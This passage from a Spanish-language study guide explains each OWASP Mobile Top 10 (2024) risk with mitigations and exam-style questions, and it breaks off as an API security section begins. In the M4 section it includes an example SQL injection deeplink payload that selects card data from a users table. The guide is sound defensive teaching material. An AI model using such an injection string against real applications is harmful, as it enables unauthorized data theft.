reciente disponible en la investigación es la **OWASP Mobile Top 10
2024**.\[46\] Esta lista se centra en vulnerabilidades que pueden surgir
debido a las particularidades de las plataformas móviles, el manejo de
datos en el dispositivo, la comunicación con backends y el uso de
componentes de terceros.

### 5.2. Tabla Resumen OWASP Mobile Top 10 (2024)

  ----------------------- ------------------------------ -----------------------
  **ID**                  **Nombre del Riesgo (2024)**   **Breve Descripción del
                                                         Riesgo**

  M1                      Improper Credential Usage      Manejo, almacenamiento
                                                         o transmisión
                                                         incorrectos de
                                                         credenciales, API keys,
                                                         o tokens.

  M2                      Inadequate Supply Chain        Vulnerabilidades
                          Security                       introducidas a través
                                                         de componentes de
                                                         terceros, durante el
                                                         desarrollo, o en el
                                                         proceso de
                                                         build/distribución.

  M3                      Insecure                       Fallos en cómo la app
                          Authentication/Authorization   verifica quién es el
                                                         usuario y qué tiene
                                                         permitido hacer.

  M4                      Insufficient Input/Output      Fallo en validar y
                          Validation                     sanitizar correctamente
                                                         datos de fuentes
                                                         externas o datos que se
                                                         muestran/envían.

  M5                      Insecure Communication         Transmisión de datos
                                                         sensibles sin cifrado
                                                         adecuado o medidas de
                                                         protección.

  M6                      Inadequate Privacy Controls    Manejo descuidado de
                                                         Información
                                                         Personalmente
                                                         Identificable (PII),
                                                         recolección excesiva o
                                                         exposición no
                                                         intencionada.

  M7                      Insufficient Binary            Falta de mecanismos
                          Protections                    para proteger el
                                                         binario de la app (APK,
                                                         IPA) contra ingeniería
                                                         inversa y manipulación.

  M8                      Security Misconfiguration      Configuración
                                                         incorrecta de ajustes
                                                         de seguridad, permisos
                                                         y controles en la app o
                                                         backend.

  M9                      Insecure Data Storage          Almacenamiento de datos
                                                         sensibles en el
                                                         dispositivo de forma
                                                         que puedan ser
                                                         accedidos
                                                         indebidamente.

  M10                     Insufficient Cryptography      Uso de algoritmos
                                                         criptográficos débiles,
                                                         longitudes de clave
                                                         inadecuadas, o
                                                         implementación
                                                         defectuosa.

  *Fuente: \[46\]*                                       
  ----------------------- ------------------------------ -----------------------

### 5.3. Análisis Detallado de las Principales Vulnerabilidades Móviles (M1 a M10 de 2024)

- **M1: Improper Credential Usage (Uso Inadecuado de Credenciales)**

  - **Descripción:** Se refiere al manejo, almacenamiento y transmisión
    incorrectos de credenciales de autenticación, claves de API, tokens
    u otra información sensible que puede ser explotada si se
    expone.\[47, 48\]

  - **Cómo Ocurre / Vectores Específicos para Móviles:**

    - Credenciales (API keys, secretos) hardcodeadas directamente en el
      código fuente de la app (ej. archivos Java/Kotlin/Swift, scripts)
      o en archivos de configuración/recursos (ej. strings.xml,
      Info.plist).\[47, 48\]

    - Almacenamiento inseguro de credenciales en el dispositivo: texto
      plano en SharedPreferences (Android), UserDefaults (iOS), archivos
      SQLite sin cifrar, o en almacenamiento externo accesible.\[47\]

    - Caching de datos sensibles (como tokens) en memoria de forma
      insegura, haciéndolos vulnerables a herramientas de inspección de
      memoria en dispositivos rooteados/jailbroken.\[47\]

    - Exposición accidental a través de logs de depuración que no se
      eliminan en versiones de producción o se envían a servidores de
      logging remotos.\[47\]

    - Transmisión de credenciales sobre canales no seguros (HTTP en
      lugar de HTTPS).\[47\]

    - Exposición de código con secretos en repositorios públicos.\[47\]

  - **Ejemplos Específicos para Móviles:** Una API key para un servicio
    de terceros embebida en un archivo Constants.java. Un token de
    sesión de usuario almacenado en SharedPreferences sin cifrado.
    Credenciales de usuario registradas en Logcat/Console durante el
    desarrollo y no eliminadas.\[47\]

  - **Estrategias de Prevención y Mitigación:**

    - **No hardcodear credenciales:** Utilizar variables de entorno
      durante la compilación, configuración remota segura, o solicitar
      credenciales dinámicamente.\[47\]

    - **Almacenamiento seguro:** Usar el Android Keystore System y el
      iOS Keychain para almacenar claves criptográficas y pequeños
      bloques de datos sensibles. Estos sistemas ofrecen almacenamiento
      protegido por hardware (si está disponible).\[47, 49\]

    - **Cifrado en reposo:** Cifrar todos los datos sensibles
      almacenados en archivos, bases de datos (ej. SQLCipher) o
      preferencias compartidas. Las claves de cifrado deben gestionarse
      de forma segura (idealmente con Keystore/Keychain).

    - **Comunicación segura:** Usar HTTPS (TLS) para toda la
      comunicación que involucre credenciales o datos sensibles.\[47\]
      Implementar certificate pinning para mayor seguridad.

    - **Sanitización de logs:** Asegurar que no se registren
      credenciales ni datos sensibles en producción.

    - **Ofuscación de código y RASP:** La ofuscación puede dificultar la
      ingeniería inversa, y Runtime Application Self-Protection (RASP)
      puede detectar y responder a intentos de manipulación o extracción
      de secretos en tiempo de ejecución.\[47\]

- **M2: Inadequate Supply Chain Security (Seguridad Inadecuada de la
  Cadena de Suministro)**

  - **Descripción:** Vulnerabilidades introducidas en la aplicación
    móvil a través de componentes de terceros (librerías, SDKs), durante
    el proceso de desarrollo, o en el pipeline de construcción y
    distribución.\[50, 51\]

  - **Cómo Ocurre / Vectores Específicos para Móviles:**

    - Inclusión de SDKs o librerías de terceros maliciosas, vulnerables
      o que recopilan datos excesivos.

    - Compromiso de las herramientas de desarrollo, sistemas de CI/CD, o
      repositorios de código, permitiendo la inyección de código
      malicioso.

    - Uso de claves de firma de aplicaciones comprometidas para firmar y
      distribuir versiones maliciosas de la app.\[50\]

    - Falta de revisión de seguridad y validación de componentes de
      terceros antes de su integración.

    - Actualizaciones inseguras de componentes de terceros.

  - **Ejemplos Específicos para Móviles:** Un SDK de publicidad popular
    que es comprometido para incluir spyware. Una librería de análisis
    de código abierto con una vulnerabilidad conocida que no se
    actualiza. Un desarrollador descarga una versión troyanizada de una
    herramienta de desarrollo.\[50, 51\]

  - **Estrategias de Prevención y Mitigación:**

    - **Prácticas de codificación segura y revisiones de código:**
      Aplicar a todo el código, incluyendo integraciones de
      terceros.\[50\]

    - **Procesos seguros de firma y distribución de apps:** Proteger las
      claves de firma rigurosamente. Utilizar los mecanismos de
      protección de las tiendas de aplicaciones (Google Play App
      Signing, Apple Notarization).\[50\]

    - **Vetting de componentes de terceros:** Utilizar solo librerías y
      SDKs de fuentes confiables y validadas. Analizar sus permisos,
      comportamiento de red y vulnerabilidades conocidas (SCA).\[50\]

    - **Controles de seguridad para actualizaciones y parches:**
      Asegurar que las actualizaciones de la app y sus componentes sean
      seguras.\[50\]

    - **Monitoreo y detección de incidentes:** Implementar mecanismos
      para detectar y responder a incidentes de seguridad en la cadena
      de suministro.\[50\]

    - **Principio de mínimo privilegio para dependencias:** Otorgar a
      las librerías solo los permisos que necesitan.

- **M3: Insecure Authentication/Authorization
  (Autenticación/Autorización Insegura)**

  - **Descripción:** Fallos en cómo la aplicación móvil y su backend
    asociado verifican la identidad del usuario (autenticación) y
    determinan qué acciones y datos tiene permitido acceder ese usuario
    (autorización).\[45, 52\]

  - **Cómo Ocurre / Vectores Específicos para Móviles:**

    - Almacenamiento inseguro de tokens de sesión o API keys en el
      dispositivo (relacionado con M1 y M9).

    - Depender únicamente de chequeos de autenticación/autorización del
      lado del cliente, que pueden ser fácilmente eludidos mediante la
      manipulación de la app o el tráfico de red (ej. con Frida, Burp
      Suite).\[52\]

    - Falta de verificación robusta y consistente en el servidor backend
      para cada solicitud sensible.

    - Políticas de contraseña débiles impuestas por la app o el backend.

    - Endpoints de API backend que son llamados por la app móvil y que
      son anónimos o tienen controles de autorización deficientes.\[45,
      49\]

    - Manejo incorrecto de sesiones (ej. tokens que no expiran, no se
      invalidan en el logout del lado del servidor).

    - Vulnerabilidades de Insecure Direct Object Reference (IDOR) en las
      llamadas a API desde el móvil.\[49\]

  - **Ejemplos Específicos para Móviles:** Una app que valida un PIN de
    acceso solo localmente sin consultar al servidor. Una API backend
    que permite a un usuario modificar el perfil de otro usuario
    simplemente cambiando un ID en la solicitud. Una app que almacena el
    token de sesión en un archivo de texto plano y lo envía en cada
    solicitud sin verificar su validez en el servidor para cada acción
    crítica.\[52\]

  - **Estrategias de Prevención y Mitigación:**

    - **Autenticación fuerte:** Implementar autenticación multifactor
      (MFA) si es apropiado para la sensibilidad de la app. Utilizar
      mecanismos de bloqueo de cuenta después de intentos
      fallidos.\[52\]

    - **Validación siempre en backend:** Toda la lógica de autenticación
      y autorización crítica debe residir y ser validada en el servidor
      backend. No confiar en los chequeos del lado del cliente.\[52\]

    - **Tokens seguros:** Usar tokens de sesión (ej. JWT) de corta
      duración, transmitidos de forma segura (HTTPS), y almacenados de
      forma segura en el dispositivo (Keystore/Keychain). Asegurar que
      los tokens sean validados y sus permisos verificados en el
      servidor para cada solicitud.

    - **Invalidación de sesión:** Implementar la invalidación de sesión
      del lado del servidor al cerrar sesión o después de un período de
      inactividad.

    - **Control de Acceso Basado en Roles (RBAC):** Definir roles y
      permisos claros en el backend y hacerlos cumplir.\[52\]

    - **Protección contra bypass:** Implementar detección de
      root/jailbreak y anti-tampering para dificultar la manipulación de
      la lógica del cliente, pero sin depender de ello como única medida
      de seguridad.

- **M4: Insufficient Input/Output Validation (Validación Insuficiente de
  Entradas/Salidas)**

  - **Descripción:** La aplicación no valida, filtra o sanitiza
    adecuadamente los datos provenientes de fuentes externas (entradas
    del usuario, datos de red, comunicación entre procesos - IPC,
    deeplinks, notificaciones push) antes de usarlos, o no sanitiza
    adecuadamente los datos que se muestran al usuario o se envían a
    otros sistemas.\[53, 54\]

  - **Cómo Ocurre / Vectores Específicos para Móviles:**

    - **Entradas:** Campos de texto, parámetros de deeplinks, datos de
      APIs, archivos cargados, datos de NFC/Bluetooth, payloads de IPC.
      La falta de validación puede llevar a SQL Injection en bases de
      datos locales, XSS en WebViews, command injection si se interactúa
      con componentes nativos del SO, o corrupción de datos.\[53, 54\]

    - **Salidas:** Datos mostrados en WebViews, notificaciones, o
      enviados a logs o APIs. La falta de sanitización puede llevar a
      XSS o fugas de información.\[54\]

  - **Ejemplos Específicos para Móviles:** Un deeplink
    myapp://producto?id=\' UNION SELECT cc FROM users \-- que causa SQLi
    en la base de datos local. Una app que muestra contenido de una API
    externa en un WebView sin escapar HTML, permitiendo XSS. Una app que
    recibe un intent malformado de otra app y crashea o ejecuta código
    no deseado. Entrada maliciosa que lleva a ejecución remota de código
    (RCE).\[53, 54\]

  - **Estrategias de Prevención y Mitigación:**

    - **Validación estricta de entradas:** Validar tipo, longitud,
      formato, rango para todas las entradas. Usar listas blancas en
      lugar de listas negras.\[54\]

    - **Sanitización de salidas:** Codificar adecuadamente los datos
      según el contexto de salida (HTML, JS, SQL, logs).\[54\]

    - **Validación específica del contexto:** Para deeplinks, validar
      todos los parámetros. Para WebViews, deshabilitar JavaScript si no
      es necesario, o usar interfaces seguras (ej.
      addJavascriptInterface con cuidado en Android). Para IPC, validar
      el origen y el contenido de los mensajes.

    - **Prácticas de codificación segura:** Usar consultas
      parametrizadas para bases de datos locales (SQLite).\[54\]

    - **Pruebas de seguridad regulares:** Incluir fuzzing de entradas y
      revisión de manejo de salidas.\[54\]

    - **Manejo seguro de WebViews:** Configurar WebViews para minimizar
      riesgos (ej. setJavaScriptEnabled(false) si es posible,
      setAllowFileAccess(false)).

- **M5: Insecure Communication (Comunicación Insegura)**

  - **Descripción:** Transmisión de datos sensibles entre la aplicación
    móvil y el backend, u otros endpoints, sin cifrado adecuado o sin
    medidas de protección contra la interceptación o modificación (ej.
    ataques Man-in-the-Middle - MitM).\[45, 55, 56, 57\]

  - **Cómo Ocurre / Vectores Específicos para Móviles:**

    - Uso de HTTP en lugar de HTTPS para transmitir datos
      sensibles.\[55\]

    - Implementación incorrecta de SSL/TLS: uso de protocolos obsoletos
      (SSLv3, TLS 1.0/1.1), suites de cifrado débiles, o configuraciones
      erróneas del servidor.\[55, 57\]

    - Aceptación de certificados SSL/TLS inválidos: auto-firmados,
      expirados, con nombre de host incorrecto, o de CAs no confiables,
      sin alertar al usuario o fallando la conexión.\[57\]

    - Falta de validación de la cadena de certificados.

    - Certificate Pinning no implementado o implementado
      incorrectamente, lo que podría haber prevenido algunos ataques
      MitM.

    - Envío de datos sensibles a través de canales alternativos no
      seguros como SMS, MMS o notificaciones push sin cifrado
      adicional.\[56\]

  - **Ejemplos Específicos para Móviles:** Una app de banca enviando
    credenciales de inicio de sesión sobre una conexión HTTP. Una app
    que ignora errores de certificado SSL y continúa la conexión. Una
    app que usa una librería de red que por defecto permite conexiones
    con TLS 1.0.\[56, 57\]

  - **Estrategias de Prevención y Mitigación:**

    - **Usar SSL/TLS para todas las comunicaciones:** Asegurar que todos
      los datos, especialmente los sensibles, se transmitan
      exclusivamente sobre HTTPS.\[56, 57\]

    - **Configuración robusta de SSL/TLS:** Utilizar versiones actuales
      de TLS (1.2 o superior) con suites de cifrado fuertes y forward
      secrecy. Configurar el servidor para priorizar ciphers
      seguros.\[56, 57\]

    - **Validación estricta de certificados:** Verificar siempre la
      validez del certificado del servidor, incluyendo la cadena de
      confianza hasta una CA raíz confiable, la fecha de expiración y el
      nombre de host. No permitir conexiones si el certificado es
      inválido.\[57\]

    - **Certificate Pinning:** Considerar implementar certificate
      pinning para aplicaciones de alta seguridad. Esto implica
      incrustar (o \"pinnear\") el certificado del servidor o su clave
      pública dentro de la aplicación cliente para asegurar que la app
      solo se comunique con el servidor legítimo.\[56, 57\]

    - **Alertar al usuario:** Si se detecta un certificado inválido,
      alertar al usuario y no permitir la conexión por defecto.

    - **Cifrado adicional:** Para datos extremadamente sensibles,
      considerar cifrarlos a nivel de aplicación antes de enviarlos a
      través del canal TLS.\[56\]

    - **Específico de Android:** Remover código que permita aceptar
      todos los certificados (ej. AllowAllHostnameVerifier). Asegurar
      que checkServerTrusted esté bien implementado si se extiende
      SSLSocketFactory.\[57\]

- **M6: Inadequate Privacy Controls (Controles de Privacidad
  Inadecuados)**

  - **Descripción:** Manejo descuidado de Información Personalmente
    Identificable (PII), recolección excesiva de datos, o exposición no
    intencionada de PII, violando la privacidad del usuario y
    potencialmente regulaciones como GDPR o CCPA.\[49, 58\]

  - **Cómo Ocurre / Vectores Específicos para Móviles:**

    - Almacenamiento y comunicación insegura de PII (se solapa con M9 y
      M5).\[58\]

    - Acceso a PII con autenticación/autorización insegura (se solapa
      con M3 y M1).\[58\]

    - Registro (logging) de PII en logs de la app o del sistema, que
      pueden ser accesibles o enviados a terceros.\[58\]

    - Exposición de PII en mensajes de error mostrados al usuario o en
      reportes de crash.\[58\]

    - Uso de PII en parámetros de URL para llamadas a API (visibles en
      logs de servidor, analíticas).\[58\]

    - Solicitud de permisos excesivos por parte de la app (ej. acceso a
      contactos, ubicación, micrófono cuando no es necesario para la
      funcionalidad principal).\[59\]

    - Fugas de datos a través de SDKs de terceros (publicidad,
      analíticas) que recopilan más PII de la necesaria o la transmiten
      de forma insegura.

  - **Ejemplos Específicos para Móviles:** Una app de linterna que
    solicita acceso a los contactos y la ubicación del usuario.\[59\]
    Logs de errores de una app de salud que incluyen el nombre y
    diagnóstico del paciente. PII (como un email) enviada como parámetro
    GET en una URL de una API llamada desde la app.\[58\]

  - **Estrategias de Prevención y Mitigación:**

    - **Minimización de datos:** Recolectar y procesar solo la PII
      estrictamente necesaria para la funcionalidad de la app.\[49, 58\]
      Preguntar si ciertos datos pueden ser reemplazados por información
      menos crítica o reducida en granularidad (ej. ubicación aproximada
      en lugar de precisa).\[58\]

    - **No almacenar/transmitir PII a menos que sea esencial:** Si se
      hace, protegerla con controles de acceso y cifrado robustos (M1,
      M3, M5, M9, M10).\[49, 58\]

    - **Sanitizar logs y mensajes de error:** Asegurar que no contengan
      PII antes de mostrarlos o enviarlos.\[58\]

    - **No usar PII en URLs:** Enviar datos sensibles en el cuerpo de
      solicitudes POST sobre HTTPS.

    - **Principio de mínimo privilegio para permisos:** Solicitar solo
      los permisos de dispositivo absolutamente necesarios para el
      funcionamiento de la app. Explicar claramente al usuario por qué
      se necesitan.\[59\]

    - **Revisar SDKs de terceros:** Entender qué datos recopilan los
      SDKs integrados y cómo los manejan.

    - **Políticas de privacidad claras:** Informar a los usuarios sobre
      qué datos se recopilan, cómo se usan y protegen.

- **M7: Insufficient Binary Protections (Protecciones Binarias
  Insuficientes)**

  - **Descripción:** Falta de mecanismos para proteger el binario de la
    aplicación (APK en Android, IPA en iOS) contra la ingeniería
    inversa, el análisis y la manipulación (tampering).\[60, 61\]

  - **Cómo Ocurre / Vectores Específicos para Móviles:**

    - Código no ofuscado, facilitando la decompilación y comprensión de
      la lógica de la app.

    - Secretos (API keys, claves criptográficas, URLs de endpoints
      sensibles) hardcodeados en el código o archivos de recursos, que
      pueden ser extraídos mediante ingeniería inversa.\[60, 61\]

    - Falta de detección de jailbreak (iOS) o root (Android), entornos
      que facilitan la instrumentación y el análisis dinámico.

    - Falta de mecanismos anti-debugging que impidan adjuntar un
      depurador a la app.

    - Falta de chequeos de integridad del código (anti-tampering) para
      detectar si la app ha sido modificada.\[61\]

  - **Ejemplos Específicos para Móviles:** Un atacante decompila un APK,
    encuentra una API key para un servicio de pago y la utiliza para
    realizar llamadas gratuitas.\[60, 61\] Un juego móvil es modificado
    para saltarse las verificaciones de licencia o para obtener moneda
    del juego ilimitada.\[60, 61\] Una app bancaria es reempaquetada con
    código malicioso para robar credenciales y distribuida a través de
    tiendas no oficiales.\[61\]

  - **Estrategias de Prevención y Mitigación:**

    - **Ofuscación de código:** Dificulta la comprensión del código
      decompilado.\[60, 61\]

    - **Compilación nativa:** Mover lógica sensible a código nativo
      (C/C++) puede hacer la ingeniería inversa más difícil que con
      Java/Kotlin/Swift.

    - **No hardcodear secretos:** Almacenarlos de forma segura
      (Keystore/Keychain) o obtenerlos de un servidor seguro en tiempo
      de ejecución.

    - **Detección de root/jailbreak:** La app puede alterar su
      comportamiento o negarse a ejecutar ciertas funciones sensibles en
      un dispositivo comprometido.

    - **Anti-debugging y Anti-tampering:** Implementar técnicas para
      detectar y dificultar la depuración y la modificación del código
      de la app.\[61\]

    - **Runtime Application Self-Protection (RASP):** Soluciones que
      permiten a la app monitorearse a sí misma y reaccionar a amenazas
      en tiempo de ejecución.

    - **Chequeos de seguridad locales reforzados por el backend:** Por
      ejemplo, si una característica requiere una licencia, el backend
      también debe validar la licencia, no solo el cliente.\[61\]

- **M8: Security Misconfiguration (Configuración de Seguridad
  Incorrecta)**

  - **Descripción:** Configuración incorrecta de ajustes de seguridad,
    permisos y controles en la propia aplicación móvil, en el sistema
    operativo subyacente, o en el backend con el que interactúa la app.
    Similar a A05 para web, pero con consideraciones móviles
    específicas.\[46, 59, 62\]

  - **Cómo Ocurre / Vectores Específicos para Móviles:**

    - Ajustes por defecto inseguros en la configuración de la app o del
      servidor.

    - Controles de acceso a archivos o componentes de la app mal
      configurados (ej. content providers, activities, services,
      broadcast receivers en Android exportados innecesariamente o sin
      la debida protección de permisos).\[59, 62\]

    - Uso de cifrado débil o ausente para proteger datos o
      comunicaciones.

    - Almacenamiento no protegido de datos sensibles (ver M9).

    - Gestión de sesión mal configurada (ver M3).

    - Permisos de archivos del sistema de la app demasiado permisivos
      (ej. world-readable o world-writable para SharedPreferences o
      archivos de base de datos).\[59, 62\]

    - Características de depuración (ej. android:debuggable=\"true\")
      habilitadas en builds de producción.\[59, 62\]

    - Configuración insegura de FileProvider en Android, exponiendo
      rutas de archivos.\[62\]

    - Backup de Android (android:allowBackup=\"true\") habilitado para
      apps que manejan datos sensibles, permitiendo su extracción si el
      backup no está cifrado.\[59\]

    - Permisos de app excesivos solicitados en el manifiesto.\[59, 62\]

  - **Ejemplos Específicos para Móviles:** Una Activity de Android que
    maneja datos sensibles es exportada y no está protegida por
    permisos, permitiendo a otra app maliciosa invocarla y
    acceder/manipular los datos.\[62\] SharedPreferences configuradas
    como MODE_WORLD_READABLE (obsoleto pero ilustrativo).\[62\] Una app
    de linterna que solicita permisos de Contactos y SMS.\[59\]

  - **Estrategias de Prevención y Mitigación:**

    - **Asegurar configuraciones por defecto:** Revisar y endurecer
      todas las configuraciones de la app, componentes y manifiesto.

    - **No usar credenciales por defecto hardcodeadas**.\[59\]

    - **Permisos de archivos adecuados:** Usar los modos de operación
      más restrictivos para archivos y bases de datos (ej. MODE_PRIVATE
      en Android).

    - **Principio de mínimo privilegio para permisos de app:** Solicitar
      solo los permisos estrictamente necesarios para la funcionalidad
      principal.\[59\]

    - **Configuración de red segura:** Forzar HTTPS, configurar Network
      Security Configuration en Android.

    - **Deshabilitar depuración en release:** Asegurar que
      android:debuggable sea false en producción.\[59\]

    - **Controlar la exportación de componentes Android:** Exportar solo
      los componentes que necesitan ser accedidos por otras apps y
      protegerlos con permisos.

    - **Gestionar backups de Android:** Establecer
      android:allowBackup=\"false\" si la app maneja datos muy sensibles
      que no deberían ser respaldados, o implementar un BackupAgent
      personalizado para controlar qué se respalda.\[59\]

- **M9: Insecure Data Storage (Almacenamiento Inseguro de Datos)**

  - **Descripción:** Almacenamiento de datos sensibles en el dispositivo
    móvil de una manera que los hace vulnerables al acceso no autorizado
    por parte de otras aplicaciones en el mismo dispositivo (si los
    sandboxes se eluden o los permisos son laxos) o por un atacante con
    acceso físico o lógico al dispositivo (especialmente si está
    rooteado/jailbroken).\[45, 63, 64\]

  - **Cómo Ocurre / Vectores Específicos para Móviles:**

    - Falta de cifrado para datos sensibles almacenados en reposo:
      archivos en almacenamiento interno/externo, bases de datos SQLite,
      SharedPreferences (Android), UserDefaults/Plist (iOS), Realm,
      etc..\[63, 64\]

    - Uso de algoritmos de cifrado débiles o claves de cifrado
      hardcodeadas/almacenadas inseguramente (ver M10 y M1).\[63\]

    - Caching inseguro de datos sensibles (ej. respuestas de API con
      PII) en archivos temporales o en memoria sin protección
      adecuada.\[63\]

    - Logging desprotegido de información sensible en archivos de log en
      el dispositivo que pueden ser leídos por otras apps (con permisos)
      o mediante herramientas forenses.\[63\]

    - Configuración insegura de almacenamiento en la nube sincronizado
      desde el móvil (ej. buckets S3 públicamente accesibles
      configurados por la app).

    - Manejo incorrecto de archivos temporales que contienen datos
      sensibles, no eliminándolos de forma segura.\[63\]

    - Exposición no intencionada de datos a través de backups no
      cifrados.

  - **Ejemplos Específicos para Móviles:** Una app que almacena el token
    de autenticación del usuario en un archivo de SharedPreferences sin
    cifrar.\[63\] Una base de datos SQLite que contiene PII de clientes
    sin ninguna capa de cifrado. Fotos o documentos sensibles guardados
    en el almacenamiento externo sin cifrar, accesibles por cualquier
    app con permiso de lectura de almacenamiento externo.

  - **Estrategias de Prevención y Mitigación:**

    - **Cifrado fuerte para datos sensibles en reposo:** Cifrar todos
      los datos sensibles antes de escribirlos en el almacenamiento.
      Utilizar APIs de cifrado robustas proporcionadas por la plataforma
      (ej. AES-GCM).\[49, 63\]

    - **Gestión segura de claves de cifrado:** Almacenar las claves de
      cifrado de forma segura utilizando el Android Keystore y el iOS
      Keychain. Estas claves nunca deben ser hardcodeadas.\[64\]

    - **Utilizar el almacenamiento interno de la aplicación:** Por
      defecto, los archivos en el almacenamiento interno de una app son
      privados para esa app. Evitar el almacenamiento externo para datos
      sensibles si es posible.

    - **SQLCipher:** Para cifrar bases de datos SQLite completas.

    - **Sanitizar logs y caché:** No escribir datos sensibles en logs o
      archivos de caché, o si es inevitable, cifrarlos.

    - **Manejo seguro de archivos temporales:** Eliminar de forma segura
      los archivos temporales después de su uso.

    - **Controlar backups:** Excluir datos sensibles de los backups
      automáticos si es necesario.

    - **Validación de entradas y salidas:** Prevenir que datos
      maliciosos o fugas de datos terminen en el almacenamiento.

- **M10: Insufficient Cryptography (Criptografía Insuficiente)**

  - **Descripción:** Uso de algoritmos criptográficos débiles o
    anticuados, longitudes de clave inadecuadas, mala gestión de claves,
    o una implementación defectuosa de protocolos y funciones
    criptográficas, lo que resulta en una protección ineficaz de los
    datos.\[65, 66\]

  - **Cómo Ocurre / Vectores Específicos para Móviles:**

    - Uso de algoritmos de cifrado débiles o rotos (ej. DES, RC4) o
      modos de operación inseguros (ej. AES en modo ECB).\[66\]

    - Longitudes de clave insuficientes para algoritmos como RSA o
      AES.\[66\]

    - Gestión de claves deficiente: claves hardcodeadas, generadas de
      forma predecible, no rotadas, o almacenadas inseguramente (ver
      M1).\[65, 66\]

    - Vectores de Inicialización (IVs) estáticos, predecibles,
      reutilizados o no aleatorios.

    - Generadores de números aleatorios (RNGs) inseguros o no
      criptográficamente seguros (CSPRNGs) para generar claves, IVs,
      sales, etc..\[66\]

    - Implementación incorrecta de protocolos criptográficos o fallos en
      el uso de librerías criptográficas.

    - Falta de salting o uso de sales débiles/estáticas al hashear
      contraseñas u otros datos.\[49, 66\]

    - No utilizar Funciones de Derivación de Claves (KDFs) como PBKDF2,
      bcrypt, scrypt para derivar claves de contraseñas.\[66\]

    - Falta de autenticación e integridad en los datos cifrados (ej.
      usar solo cifrado sin un MAC).

  - **Ejemplos Específicos para Móviles:** Una app que cifra datos de
    usuario con AES y una clave hardcodeada en el código. Una app que
    hashea contraseñas usando MD5 sin salt. Generar un IV para AES CBC
    usando System.currentTimeMillis().\[65, 66\]

  - **Estrategias de Prevención y Mitigación:**

    - **Usar algoritmos de cifrado fuertes y estándar:** AES (con modos
      seguros como GCM o CBC con HMAC), RSA, ECC. Evitar algoritmos
      obsoletos.\[65, 66\]

    - **Asegurar longitudes de clave suficientes:** Seguir las
      recomendaciones de la industria (ej. AES-256, RSA-2048 o
      superior).\[65, 66\]

    - **Gestión segura de claves:** Generar claves aleatoriamente usando
      CSPRNGs. Almacenar claves de forma segura (Android Keystore, iOS
      Keychain). Implementar rotación de claves si es necesario.\[65,
      66\]

    - **IVs correctos:** Para modos como CBC, los IVs deben ser únicos y
      aleatorios (impredecibles) para cada cifrado con la misma clave.

    - **Usar funciones hash fuertes:** SHA-256 o superior para
      integridad. Para contraseñas, usar bcrypt, scrypt, Argon2 o
      PBKDF2.\[65, 66\]

    - **Implementar salting:** Usar siempre una salt fuerte y aleatoria
      única por usuario al hashear contraseñas.\[65, 66\]

    - **Usar KDFs:** Para derivar claves criptográficas a partir de
      contraseñas.\[66\]

    - **Validar y autenticar:** Asegurar la integridad y autenticidad de
      los datos cifrados (ej. usando modos AEAD como AES-GCM, o HMAC con
      cifrado).

    - **Actualizar librerías criptográficas:** Mantener actualizadas las
      librerías para beneficiarse de parches de seguridad.

La seguridad móvil presenta un conjunto único de desafíos debido a la
portabilidad de los dispositivos, el potencial de acceso físico, las
diferencias entre plataformas (Android e iOS) y la dependencia de un
ecosistema complejo de tiendas de aplicaciones y SDKs de terceros. Los
riesgos móviles, al igual que los de la web, están interconectados. Por
ejemplo, M9:Insecure Data Storage puede ser una consecuencia directa de
M10:Insufficient Cryptography si los datos se almacenan sin cifrar o con
un cifrado débil. De manera similar, M1:Improper Credential Usage, como
las credenciales hardcodeadas, es una forma de M7:Insufficient Binary
Protections (ya que la ingeniería inversa las revelaría) y también
contribuye a M9:Insecure Data Storage si esas credenciales se utilizan
para \"proteger\" otros datos almacenados.

Un aspecto cada vez más crítico es M2:Inadequate Supply Chain
Security.\[50, 51\] La seguridad de una aplicación móvil ya no depende
únicamente del código escrito por el desarrollador principal, sino que
está intrínsecamente ligada a la seguridad de todas las librerías de
terceros, SDKs (de publicidad, análisis, etc.), herramientas de
desarrollo y los propios procesos de CI/CD. Un eslabón débil en esta
cadena, como un SDK popular comprometido, puede anular todas las buenas
prácticas de codificación segura implementadas en el código propio. Esto
exige una diligencia debida exhaustiva y un monitoreo continuo de todos
los componentes de la cadena de suministro, adoptando una postura de
\"confianza cero\" incluso para elementos aparentemente benignos.

### 5.4. Posibles Preguntas y Respuestas del Examen

- **P: ¿Qué es M1: Improper Credential Usage en el contexto móvil y cómo
  se puede mitigar el riesgo de credenciales hardcodeadas en una app
  Android?**

  - R: M1 se refiere al manejo, almacenamiento o transmisión incorrecta
    de credenciales. Para evitar el hardcoding de, por ejemplo, una API
    key en Android, se puede almacenar en el archivo gradle.properties
    (y excluirlo del control de versiones), acceder a ella a través de
    BuildConfig, o recuperarla de un servidor seguro en tiempo de
    ejecución. Idealmente, las claves sensibles deben gestionarse a
    través del Android Keystore.\[47\]

- **P: Explique el riesgo M5: Insecure Communication y mencione dos
  prácticas específicas de Android para prevenirlo, además del uso de
  HTTPS.**

  - R: M5 es la transmisión de datos sensibles sin cifrado adecuado. En
    Android, además de HTTPS, se puede usar la Network Security
    Configuration para definir políticas de comunicación segura (ej.
    forzar TLS, configurar trust anchors, deshabilitar cleartext
    traffic). También es crucial remover código de desarrollo que acepte
    todos los certificados (ej. AllowAllHostnameVerifier) y asegurar que
    la validación de certificados (ej. checkServerTrusted en
    SSLSocketFactory personalizadas) sea correcta.\[57\]

- **P: ¿Por qué M7: Insufficient Binary Protections es un riesgo
  importante para las apps móviles y qué técnicas se pueden usar para
  mitigarlo?**

  - R: Es importante porque los binarios de las apps (APK/IPA) pueden
    ser fácilmente obtenidos, decompilados y analizados para extraer
    secretos (API keys, algoritmos propietarios) o modificados
    (tampering) para eludir controles de seguridad o insertar malware.
    Técnicas de mitigación incluyen ofuscación de código, detección de
    root/jailbreak, mecanismos anti-tampering (chequeos de integridad
    del código), y RASP (Runtime Application Self-Protection).\[60, 61\]

- **P: Describa un ejemplo de M9: Insecure Data Storage en una app iOS y
  cómo se podría haber prevenido.**

  - R: Ejemplo: Almacenar un token de API sensible en UserDefaults sin
    ningún tipo de cifrado. Esto es inseguro porque UserDefaults es un
    archivo plist no cifrado en el sandbox de la app, accesible si el
    dispositivo está jailbroken. Prevención: Almacenar el token en el
    iOS Keychain, que proporciona almacenamiento cifrado y protegido por
    hardware para pequeños datos secretos.\[63, 64\]

## 6. Desarrollo Seguro de APIs

Las Interfaces de Programación de Aplicaciones (APIs) son la columna
vertebral de las arquitecturas de software modernas, facilitando la
comunicación entre microservicios, aplicaciones móviles y sus backends,
sistemas IoT y servicios de terceros. Dada su criticidad y exposición,
la seguridad de las APIs es primordial. El proyecto OWASP API Security
Top 10 se enfoca en los riesgos de seguridad más significativos y
